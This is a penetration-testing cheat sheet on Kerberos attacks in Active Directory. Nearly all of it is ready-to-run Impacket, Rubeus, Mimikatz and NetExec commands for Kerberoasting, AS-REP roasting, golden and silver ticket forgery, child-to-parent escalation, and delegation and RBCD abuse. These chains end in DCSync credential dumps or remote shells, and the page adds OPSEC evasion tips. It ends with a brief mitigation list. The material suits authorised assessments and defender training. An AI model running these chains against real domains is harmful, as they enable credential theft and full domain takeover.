# Kerberos Attacks

Kerberos is Active Directory's authentication protocol, and almost every AD privilege-escalation path touches it. These attacks can turn a single set of domain credentials into cracked service passwords, forged tickets, and Domain Admin access. In internal assessments, this is often where a foothold becomes domain compromise; begin after [enumerating the domain](ad-attacks.md).

{% hint style="warning" %}
Kerberos is clock-sensitive. Tickets are rejected outside a 5-minute skew window with `KRB_AP_ERR_SKEW`. Before any ticket operation against a DC, sync time: `sudo ntpdate <DC_IP>` (or `sudo rdate -n <DC_IP>`).
{% endhint %}

## Attack picker

| You have... | Attack | Result |
| --- | --- | --- |
| Any valid domain user | [Kerberoasting](#kerberoasting) | Crack service-account passwords offline |
| A user list, no creds | [AS-REP Roasting](#as-rep-roasting) | Crack pre-auth-disabled accounts offline |
| `GenericWrite`/`GenericAll` on a user | [Targeted Kerberoasting](#targeted-kerberoasting-acl-abuse) | Plant SPN, roast, clean up |
| KRBTGT hash + domain SID | [Golden Ticket](#golden-ticket) | Forge any TGT, impersonate anyone |
| A service account's NT hash | [Silver Ticket](#silver-ticket) | Forge a service ticket, offline, no DC |
| `msDS-AllowedToDelegateTo` on an account | [Constrained Delegation](#constrained-delegation-s4u2proxy) | Impersonate users to a service |
| An unconstrained-delegation host + coercion | [Unconstrained Delegation](#unconstrained-delegation) | Capture a DC's TGT |
| Write on `msDS-AllowedToActOnBehalfOfOtherIdentity` | [RBCD](#rbcd-resource-based-constrained-delegation) | Impersonate admin to the target |
| Child-domain KRBTGT + parent SID | [ExtraSids / child→parent](#child--parent-domain-escalation-extrasids) | Escalate to Enterprise Admin |

## Kerberoasting

Any authenticated domain user can request a service ticket (TGS) for any account that has a Service Principal Name (SPN). The ticket is encrypted with the service account's password hash, so you crack it offline — no lockout, no noise on the target service.

### Requirements

* Valid domain credentials (any user)
* One or more accounts with SPNs set (service accounts)

### Linux — Impacket

```bash
# List all SPNs (no ticket request)
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>

# Request TGS tickets for every SPN
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request

# Request one user's TGS to a file
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user sqldev -outputfile sqldev.hash

# Kerberos-only (NTLM disabled)
GetUserSPNs.py <DOMAIN>/<USER>:'<PASS>' -dc-host <DC_FQDN> -k -request
```

### Windows — Rubeus

```powershell
# Stats first — how many roastable accounts, which etypes
.\Rubeus.exe kerberoast /stats

# Roast everything (no line wrapping in output)
.\Rubeus.exe kerberoast /nowrap

# Roast only admincount=1 accounts (high value)
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Roast a specific user
.\Rubeus.exe kerberoast /user:sqldev /nowrap

# Force RC4 via the tgtdeleg trick (much faster to crack than AES)
.\Rubeus.exe kerberoast /tgtdeleg
```

### Windows — PowerView

```powershell
Import-Module .\PowerView.ps1

# Find users with SPNs
Get-DomainUser * -SPN | select samaccountname,serviceprincipalname

# Get a Hashcat-format ticket for one user
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Export all to CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv
```

### Windows — setspn (built-in)

```cmd
setspn -Q */*
setspn -T <DOMAIN> -Q */*
```

### From NetExec / CrackMapExec

```bash
netexec ldap <DC_IP> -u <USER> -p '<PASS>' --kerberoasting output.txt
```

### Crack the TGS

```bash
# etype 23 (RC4) — most common, fastest
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
john --format=krb5tgs tgs.hash --wordlist=rockyou.txt

# etype 17 (AES128)
hashcat -m 19600 tgs.hash rockyou.txt

# etype 18 (AES256)
hashcat -m 19700 tgs.hash rockyou.txt
```

### Advanced Rubeus flags

```powershell
# OPSEC-safe: avoid RC4 downgrade, add delay + jitter
.\Rubeus.exe kerberoast /rc4opsec /delay:2000 /jitter:30

# Target only AES-encrypted tickets, or force RC4
.\Rubeus.exe kerberoast /aes
.\Rubeus.exe kerberoast /tgtdeleg

# Filter by password-set date
.\Rubeus.exe kerberoast /pwdsetafter:01-01-2022 /pwdsetbefore:01-01-2024

# Scope to an OU or cap results
.\Rubeus.exe kerberoast /ou:"OU=ServiceAccounts,DC=<DOMAIN>,DC=<TLD>"
.\Rubeus.exe kerberoast /resultlimit:10

# Check which accounts are RC4-crackable (value 0/null = RC4 only)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties msds-supportedencryptiontypes,ServicePrincipalName | Select Name,msds-supportedencryptiontypes
```

### Semi-manual Kerberoasting (no tools)

```powershell
# Request a TGS with a built-in .NET class
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"

# Export tickets with Mimikatz, then convert
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

```bash
python3 kirbi2john.py <TICKET>.kirbi
sed 's/\$krb5tgs\$/\$krb5tgs\$23\$/' crack_file > hashcat_input
```

## AS-REP Roasting

Accounts with Kerberos pre-authentication disabled (`DONT_REQ_PREAUTH`) will hand out an AS-REP encrypted with the account's password hash to anyone who asks — no credentials needed. Crack it offline.

### Find pre-auth-disabled accounts

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname
Get-DomainUser -UACFilter DONT_REQ_PREAUTH | select samaccountname,userprincipalname
```

### Linux — Impacket

```bash
# Roast from a user list (no creds needed)
GetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP>

# Roast a single known user
GetNPUsers.py <DOMAIN>/<USER> -no-pass -dc-ip <DC_IP>

# Hashcat-format output to file
GetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.hash
```

### Windows — Rubeus

```powershell
.\Rubeus.exe asreproast /user:testuser /nowrap /format:hashcat
.\Rubeus.exe asreproast /nowrap /format:hashcat
.\Rubeus.exe asreproast /outfile:hashes.asreproast /format:hashcat
```

### Crack the AS-REP

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
john --format=krb5asrep --wordlist=rockyou.txt asrep.hash
```

## Targeted Kerberoasting (ACL abuse)

If you hold `GenericAll`/`GenericWrite`/`WriteProperty` on a user, plant a temporary SPN, roast it, then remove the SPN. One tool wraps all three steps. See [ACL Abuse](acl-abuse.md) for how you get that write in the first place.

```bash
# NetExec — one command
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --kerberoasting output.txt --targeted-kerberoast <VICTIM_USER>

# targetedKerberoast.py — plant SPN + roast + clean up
python3 targetedKerberoast.py -v -d <DOMAIN> -u <USER> -p '<PASS>' --dc-ip <DC_IP>

# From a gMSA / Kerberos-ticket context (NTLM disabled)
python3 targetedKerberoast.py -d <DOMAIN> --dc-host <DC_FQDN> --dc-ip <DC_IP> \
        -k --no-pass -u 'gMSA01$' -v -o svc_sql_hash.txt
```

{% hint style="info" %}
Force RC4 before roasting to speed up cracking. With `GenericWrite`/`WriteProperty`:
`Set-ADUser -Identity "<TARGET>" -Replace @{'msDS-SupportedEncryptionTypes'=0}` — RC4-only.
After a hash cracks, spray it: `kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt '<CRACKED_PW>'`.
{% endhint %}

## Timeroasting

Abuses Windows NTP authentication to request computer-account password hashes without any credentials.

```bash
sudo ./timeroast.py <DC_IP> | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt rockyou.txt
```

## Pass-the-Ticket (PtT)

Steal a Kerberos ticket from memory (or a keytab/ccache) and reuse it. TGTs let you request any service; service tickets get you into one service.

### Export tickets — Mimikatz

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export   # writes .kirbi files
mimikatz # sekurlsa::ekeys             # extract Kerberos encryption keys
```

### Export tickets — Rubeus

```powershell
.\Rubeus.exe triage            # list all tickets
.\Rubeus.exe dump /luid:0x3e7  # dump a specific logon session
.\Rubeus.exe dump /nowrap      # dump everything
```

### Import + use the ticket

```powershell
# Mimikatz
mimikatz # kerberos::ptt C:\temp\ticket.kirbi

# Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi
.\Rubeus.exe ptt /ticket:<BASE64_TICKET>

# Then act
dir \\<TARGET>\c$
winrs -r:<TARGET>.<DOMAIN> "whoami"
Enter-PSSession -ComputerName <DC>
```

### Sacrificial process (avoid clobbering your own tickets)

```powershell
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

### Linux Pass-the-Ticket (keytab / ccache)

```bash
# Is the box domain-joined?
realm list
ps -ef | grep -i "winbind\|sssd"

# Hunt for keytab and ccache files
find / -name *keytab* -ls 2>/dev/null
env | grep -i krb5
ls -la /tmp/krb5cc_*

# Inspect / impersonate from a keytab
klist -k -t /path/to/file.keytab
kinit <USER>@<DOMAIN> -k -t /path/to/<USER>.keytab
python3 keytabextract.py /path/to/file.keytab   # pull hashes

# Use a ccache
export KRB5CCNAME=/tmp/krb5cc_<UID>
smbclient //<DC>/C$ -k -c ls -no-pass
proxychains impacket-wmiexec <DC> -k
proxychains evil-winrm -i <DC> -r <DOMAIN>

# Convert between ccache and kirbi
impacket-ticketConverter krb5cc_file output.kirbi
impacket-ticketConverter ticket.kirbi output.ccache
```

## Golden Ticket

The KRBTGT account signs every TGT in the domain. With its hash you forge TGTs for any user — including a Domain Admin who may not even exist — and they stay valid until KRBTGT is rotated twice. This is the classic post-compromise persistence primitive.

### Requirements

* KRBTGT NTLM hash (or AES key)
* Domain SID
* Domain name

### Get the KRBTGT hash

```bash
# DCSync (needs replication rights — Domain Admin or delegated)
secretsdump.py <DOMAIN>/admin@<DC_IP> -just-dc-user <DOMAIN>/krbtgt
```

```powershell
# On the DC with admin (Mimikatz)
lsadump::dcsync /user:krbtgt /domain:<DOMAIN>
```

### Forge — Mimikatz

```powershell
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-1234567890-2345678901-3456789012 /krbtgt:<KRBTGT_NTLM> /ptt
mimikatz # misc::cmd
```

### Forge — Rubeus

```powershell
.\Rubeus.exe golden /rc4:<KRBTGT_NTLM> /domain:<DOMAIN> /sid:<DOMAIN_SID> /user:Administrator /ptt
```

### Forge — Impacket

```bash
ticketer.py -nthash <KRBTGT_NTLM> -domain-sid <DOMAIN_SID> -domain <DOMAIN> Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <DOMAIN>/Administrator@<DC_FQDN>
```

## Child → Parent Domain Escalation (ExtraSids)

Within a single forest, SID filtering is disabled by default. A golden ticket forged with the child KRBTGT hash and an extra-SID pointing at the parent's Enterprise Admins group (RID `-519`) escalates from child DA to forest-wide Enterprise Admin.

**Requirements:** child-domain KRBTGT hash, child domain SID, parent Enterprise Admins SID, no SID filtering (default in-forest).

### Get the SIDs and hash

```bash
# Child KRBTGT hash
impacket-secretsdump <CHILD_DOMAIN>/<ADMIN>@<CHILD_DC_IP> -just-dc-user krbtgt

# Child domain SID
impacket-lookupsid <CHILD_DOMAIN>/<ADMIN>@<CHILD_DC_IP> | grep "Domain SID"

# Parent Enterprise Admins SID (ends in -519)
impacket-lookupsid <CHILD_DOMAIN>/<ADMIN>@<PARENT_DC_IP> | grep "Enterprise Admins"
```

### Forge with ExtraSids

```bash
# Impacket — with AES key
impacket-ticketer -aesKey <KRBTGT_AES256> \
  -domain <CHILD_DOMAIN> \
  -domain-sid <CHILD_DOMAIN_SID> \
  -extra-sid <PARENT_ENTERPRISE_ADMINS_SID> \
  Administrator

# Impacket — with NTLM hash
impacket-ticketer -nthash <KRBTGT_NTLM> \
  -domain <CHILD_DOMAIN> \
  -domain-sid <CHILD_DOMAIN_SID> \
  -extra-sid <PARENT_ENTERPRISE_ADMINS_SID> \
  Administrator
```

```powershell
# Rubeus (Windows)
.\Rubeus.exe golden /rc4:<KRBTGT_NTLM> /domain:<CHILD_DOMAIN> \
  /sid:<CHILD_DOMAIN_SID> /extra-sid:<PARENT_ENTERPRISE_ADMINS_SID> \
  /user:Administrator /ptt
```

### DCSync the parent with the forged ticket

```bash
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass <PARENT_DOMAIN>/<ADMIN>@<PARENT_DC_FQDN> \
  -target-ip <PARENT_DC_IP> -just-dc

# Or shell
impacket-psexec -k -no-pass <PARENT_DC_FQDN>
```

{% hint style="warning" %}
Cross-domain Kerberos needs BOTH domains to resolve. Map each DC's FQDN in `/etc/hosts` and configure both realms in `/etc/krb5.conf`. If auth fails with "KDC did not return a TGT": verify `nslookup <DC_FQDN>` for both, check `/etc/hosts`, confirm both realms in `krb5.conf`, and check clock skew is under 5 minutes.
{% endhint %}

## Silver Ticket

A silver ticket is a forged service ticket (TGS) signed with a service account's or machine account's NT hash. No DC is involved — it's minted and used entirely offline, which makes it quiet. It grants access to one service on one host.

### Forge — Mimikatz

```powershell
# CIFS (file shares)
mimikatz # kerberos::golden /user:administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_FQDN> /rc4:<MACHINE_NT> /service:cifs /ptt

# HTTP
mimikatz # kerberos::golden /user:administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:web01.<DOMAIN> /rc4:<MACHINE_NT> /service:http /ptt
```

### Forge — Impacket

```bash
sudo ntpdate <DC_IP>
impacket-ticketer -nthash <SVC_NT> -domain-sid <DOMAIN_SID> \
  -domain <DOMAIN> -spn MSSQL/<DC_FQDN> administrator
export KRB5CCNAME=$PWD/administrator.ccache

# SPN must resolve to the tunneled endpoint — hard-map it
echo "127.0.0.1 <DC_FQDN>" | sudo tee -a /etc/hosts
impacket-mssqlclient -k <DC_FQDN>
```

### Verify the ticket landed

The ticket only helps if the client actually reuses it. Hit the target with a request that rides the cached TGS instead of triggering fresh auth:

```powershell
klist                                                  # should show the silver TGS
iwr -UseDefaultCredentials http://web01.<DOMAIN>       # HTTP — forces WinInet to send the ticket
dir \\web01.<DOMAIN>\C$                                # CIFS — lists an admin share, no new auth
Get-ADUser -Server web01.<DOMAIN> -Filter *            # LDAP
```

If it re-prompts or returns 401, the SPN + `/target` doesn't match the URL/share exactly, or the clock is out of sync.

### Common service SPNs

| SPN | Service |
| --- | --- |
| `CIFS` | File shares (SMB) |
| `HTTP` | Web services |
| `LDAP` | LDAP queries / DCSync-ish |
| `RPCSS` | RPC / WMI |
| `HOST` | Scheduled tasks, WMI |
| `MSSQLSvc` | SQL Server |

### NT hash from cleartext (silver-ticket prep)

```bash
# md4(UTF-16LE) is the NT hash
python3 -c 'import hashlib; print(hashlib.new("md4", "Service1".encode("utf-16le")).hexdigest())'
```

Fallbacks: `nthash` (hashcat-utils), `smbpasswd -a` then read `/etc/samba/private/smbpasswd`, or `impacket-secretsdump LOCAL -sam` on a box with the password set.

## Constrained Delegation (S4U2Proxy)

An account configured with `msDS-AllowedToDelegateTo` can obtain tickets to the listed services on behalf of any user via S4U2Proxy. Compromise that account and you impersonate Administrator to those services.

### Identify

```powershell
Get-DomainComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
```

```bash
ldapsearch -x -H ldap://<DC_IP> -D "<USER>@<DOMAIN>" -w '<PASS>' \
  -b "DC=..." "(msds-allowedtodelegateto=*)" \
  sAMAccountName msds-allowedtodelegateto
```

### Exploit — Impacket

```bash
# Get a TGT for the delegating account if needed
impacket-getTGT <DOMAIN>/service_account:'<PASS>' -dc-ip <DC_IP>
export KRB5CCNAME=service_account.ccache

# S4U2Proxy — request an ST as Administrator for the allowed service
impacket-getST -spn cifs/<DC_FQDN> -impersonate Administrator \
  <DOMAIN>/service_account:'<PASS>' -dc-ip <DC_IP>

# With a hash instead of a password
impacket-getST -spn cifs/<DC_FQDN> -impersonate Administrator \
  <DOMAIN>/service_account -hashes ':<HASH>' -dc-ip <DC_IP>

# Then use it
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass <TARGET_FQDN>
```

### Exploit — Rubeus

```powershell
.\Rubeus.exe s4u /user:service_account /password:'<PASS>' \
  /impersonateuser:Administrator /msdsspn:cifs/<DC_FQDN> /ptt

# With a hash and an alternate service (abuse SPN-less alt service)
.\Rubeus.exe s4u /user:delegated_account /rc4:<HASH> \
  /impersonateuser:administrator /msdsspn:cifs/<TARGET_FQDN> \
  /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
```

### S4U2Self via Shadow Credentials

When you have write over a machine's `msDS-KeyCredentialLink`, add a key credential, get a TGT via PKINIT, recover the machine NT hash, then S4U2Self to impersonate Administrator. See also [ADCS Attacks](adcs-attacks.md#shadow-credentials-certipy-shadow-auto).

```bash
# 1. Add shadow credential
python3 pywhisker.py -d <DOMAIN> -u <ADMIN_USER> -p '<PASS>' \
  --target '<MACHINE_NAME>' --action add --dc-ip <DC_IP>

# 2. TGT via PKINIT
python3 gettgtpkinit.py <DOMAIN>/'<MACHINE_NAME>' \
  -cert-pfx output.pfx -pfx-pass '<PFX_PASSWORD>' machine.ccache

# 3. Recover the machine NT hash
export KRB5CCNAME=machine.ccache
python3 getnthash.py <DOMAIN>/'<MACHINE_NAME>' -key <AS_REP_ENCRYPTION_KEY>

# 4. S4U2Self impersonating Administrator
impacket-getST -self -impersonate Administrator \
  -altservice cifs/<TARGET_FQDN> \
  <DOMAIN>/'<MACHINE_NAME>' -hashes ':<MACHINE_NTLM_HASH>' -dc-ip <DC_IP>

# 5. Lateral movement
export KRB5CCNAME=Administrator@cifs_<TARGET_FQDN>@<DOMAIN>.ccache
impacket-psexec -k -no-pass <TARGET_FQDN>
```

### Decision tree

```
Do you have msDS-AllowedToDelegateTo on a user/computer?
├─ YES, you have credentials → S4U2Proxy
│  └─ impacket-getST -spn <SPN> -impersonate <TARGET> <ACCOUNT>
├─ YES, you have GenericWrite/GenericAll on machine → Shadow Credentials
│  ├─ Add KeyCredential (pyWhisker) → PKINIT (gettgtpkinit)
│  ├─ Recover NTLM (getnthash) → S4U2Self → impersonate Administrator
└─ NO → check RBCD, ACL abuse, or delegation on related accounts
```

## Unconstrained Delegation

A host trusted for unconstrained delegation caches the TGT of any user who authenticates to it. Coerce a DC to authenticate, capture its TGT, and DCSync.

### Identify

```powershell
Get-DomainComputer -Unconstrained | select samaccountname
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
netexec ldap <DC_IP> -u <USER> -p '<PASS>' --trusted-for-delegation
```

### Capture a DC's TGT

```powershell
# Watch for inbound TGTs on the unconstrained host
Rubeus.exe monitor /interval:1

# Coerce the DC to authenticate (PrinterBug / SpoolSample)
.\SpoolSample.exe <DC_FQDN> <UNCONSTRAINED_HOST_FQDN>
```

```bash
# From Linux
printerbug.py '<DOMAIN>/<USER>:<PASS>'@<DC_FQDN> <UNCONSTRAINED_HOST>
```

```powershell
# Use the captured TGT, then DCSync
Rubeus.exe asktgs /ticket:<BASE64_TGT> /service:LDAP/<DC_FQDN>,cifs/<DC_FQDN> /ptt
mimikatz # lsadump::dcsync /user:<DOMAIN>\krbtgt
```

More coercion methods (PetitPotam, DFSCoerce) live in [relay-and-coerce.md](relay-and-coerce.md).

## RBCD (Resource-Based Constrained Delegation)

RBCD flips delegation around: the *target* resource decides who may delegate to it via `msDS-AllowedToActOnBehalfOfOtherIdentity`. If you can write that attribute on a target, point it at a machine account you control, then S4U to impersonate any user.

### Full chain — Linux

```bash
# Clock sync first
sudo ntpdate <DC_IP>

# 1. Add a controlled machine account (needs MachineAccountQuota >= 1)
impacket-addcomputer <DOMAIN>/'<USER>' -hashes :<NT> \
  -computer-name 'EVIL$' -computer-pass 'Passw0rd!' -dc-ip <DC_IP>

# 2. Write RBCD on the target → EVIL$
impacket-rbcd <DOMAIN>/'<USER>' -hashes :<NT> \
  -delegate-from 'EVIL$' -delegate-to '<TARGET>$' -action write -dc-ip <DC_IP>

# 3. S4U impersonate Administrator → CIFS/target ticket
impacket-getST <DOMAIN>/'EVIL$':'Passw0rd!' -spn cifs/<TARGET_FQDN> -impersonate Administrator -dc-ip <DC_IP>

# 4. Own the target
export KRB5CCNAME=Administrator@cifs_<TARGET_FQDN>@<DOMAIN>.ccache
impacket-secretsdump -k -no-pass <TARGET_FQDN>
```

{% hint style="info" %}
Cleanup matters for report quality. Flush the RBCD and delete the machine account when done:
`impacket-rbcd <DOMAIN>/'<USER>' -hashes :<NT> -delegate-to '<TARGET>$' -action flush -dc-ip <DC_IP>`
`impacket-addcomputer <DOMAIN>/'<USER>' -hashes :<NT> -computer-name 'EVIL$' -action del -dc-ip <DC_IP>`
{% endhint %}

### Full chain — Windows (Rubeus + PowerView)

```powershell
# 1. Create machine account (Powermad)
New-MachineAccount -MachineAccount attacker-pc -Password $(ConvertTo-SecureString '<PASS>' -AsPlainText -Force)

# 2. Get its SID
$ComputerSid = Get-DomainComputer attacker-pc -Properties objectsid | Select -Expand objectsid

# 3. Set RBCD on the target
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer <TARGET> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# 4. Hash the machine password, then S4U
Rubeus.exe hash /password:'<PASS>' /user:attacker-pc$ /domain:<DOMAIN>
Rubeus.exe s4u /user:attacker-pc$ /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_FQDN> /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
```

### RBCD via BloodyAD group chain

```bash
# Add a controlled machine into a group that has AllowedToAct on the DC
bloodyAD -d <DOMAIN> --host <DC_FQDN> -k ccache=<CCACHE> -u '<USER>' \
         add groupMember "DELEGATEDADMINS" "FS01$"

# S4U2Proxy — impersonate DC01$ (Administrator often blocked by GPO)
getST.py -spn 'cifs/dc01.<DOMAIN>' -impersonate 'DC01$' -dc-ip <DC_IP> '<DOMAIN>/FS01$:fs01'

# DCSync with the DC01$ ticket
KRB5CCNAME=DC01\$@cifs_dc01.<DOMAIN>@<REALM>.ccache secretsdump.py \
   -k -no-pass -dc-ip <DC_IP> '<DOMAIN>/DC01$@dc01.<DOMAIN>'
```

## Constrained Delegation abuse — full chain

When you hold `SeEnableDelegationPrivilege` + `GenericAll` on a computer object, turn that machine into a delegated jumping-off point to the DC.

```powershell
Set-ADComputer -Identity "FS01" -TrustedForDelegation $true
Set-ADComputer -Identity "FS01" -DNSHostName "fs01.<DOMAIN>"
Set-ADComputer -Identity "FS01" -ServicePrincipalNames @{Add='HOST/fs01.<DOMAIN>','cifs/fs01.<DOMAIN>'}
Set-ADComputer -Identity "FS01" -Replace @{'msDS-AllowedToDelegateTo'=@('ldap/dc.<DOMAIN>','cifs/dc.<DOMAIN>')}
Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $true   # protocol transition
```

```bash
# Reset the delegated computer's password (NetExec change-password module)
netexec smb <IP> -u <USER> -p '<PASS>' -M change-password -o USER='FS01$' NEWPASS='Hacked123!'

# S4U impersonating dc (Administrator often blocked by SPN validation)
getST.py '<DOMAIN>/FS01$:Hacked123!' -spn 'ldap/dc.<DOMAIN>' -impersonate dc -dc-ip <DC_IP>

# DCSync with the resulting ccache
KRB5CCNAME=dc@ldap_dc.<DOMAIN>@<REALM>.ccache secretsdump.py -k -no-pass dc.<DOMAIN>
```

## NTLM-disabled domain — Kerberos-only workflow

Modern hardened domains disable NTLM entirely, so every tool must speak Kerberos. Set up `krb5.conf`, then pass `-k` everywhere.

```bash
# 1. Sync clock (Kerberos is time-sensitive)
sudo ntpdate <DC_IP>

# 2. Generate krb5.conf from a NetExec probe
netexec smb <IP> -u <USER> -p '<PASS>' --generate-krb5-file ~/krb5.conf
sudo cp ~/krb5.conf /etc/krb5.conf
```

```bash
# 3. Append the realm manually if NetExec skipped it
sudo bash -c 'cat >> /etc/krb5.conf << EOF
[realms]
    <REALM> = { kdc = <DC_FQDN>
                admin_server = <DC_FQDN> }
[domain_realm]
    .<DOMAIN> = <REALM>
    <DOMAIN> = <REALM>
EOF'
```

```bash
# 4. Get a TGT, then use -k on everything
getTGT.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP>
export KRB5CCNAME=<USER>.ccache

GetADUsers.py -k -no-pass -dc-host <DC_FQDN> -all <DOMAIN>/<USER>
GetUserSPNs.py <DOMAIN>/<USER>:'<PASS>' -dc-host <DC_FQDN> -k -request
netexec smb <DC_IP> -u <USER> -p '<PASS>' -k
certipy find -u <USER>@<DOMAIN> -k -target <DC_FQDN>

# Evil-WinRM with a ticket (needs -r flag + IP-based KDC in krb5.conf)
ticketConverter.py <USER>.ccache /tmp/krb5cc_<USER>
export KRB5CCNAME=/tmp/krb5cc_<USER>
evil-winrm -i <DC_FQDN> -r <REALM>
```

## Key Hashcat modes

| Hash type | Mode | Tool |
| --- | --- | --- |
| TGS-REP (RC4) | 13100 | Hashcat |
| TGS-REP (AES128) | 19600 | Hashcat |
| TGS-REP (AES256) | 19700 | Hashcat |
| AS-REP | 18200 | Hashcat |
| Timeroast (NTP) | 31300 | Hashcat |
| Kerberoast | krb5tgs | John |
| AS-REP | krb5asrep | John |

## Mitigation (for the remediation section)

* Long (25+ char) passwords for SPN / service accounts; prefer gMSAs.
* Enforce AES encryption for Kerberos; disable RC4.
* Enable Kerberos armoring (FAST).
* Remove unconstrained delegation; audit constrained/RBCD trusts.
* Rotate KRBTGT twice on suspicion of golden-ticket compromise.
* Set pre-auth-required on all accounts (kills AS-REP roasting).
* Monitor for anomalous TGS requests and golden/silver ticket lifetimes.

## Related

* [Active Directory](AD.md) — AD structure, trusts, and initial vectors
* [AD Attacks](ad-attacks.md) — the full foothold → Domain Admin chain and where Kerberos fits
* [ACL Abuse](acl-abuse.md) — how you earn the write access that enables targeted Kerberoasting and RBCD
* [ADCS Attacks](adcs-attacks.md) — certificate-based TGTs, PKINIT, and UnPAC-the-hash
* [Relay and Coerce](relay-and-coerce.md) — PetitPotam / PrinterBug to feed unconstrained delegation and ADCS relay
* [CrackMapExec / NetExec](crackmapexec-netexec.md) · [Mimikatz](mimikatz.md) · [Credential Dumping](credential-dumping.md)
* [Lateral Movement](lateral-movement.md) · [Password / Hash Attacks](password-hash-attacks.md)
* [Report Writing](report-writing.md) — turning the chain into a rated finding
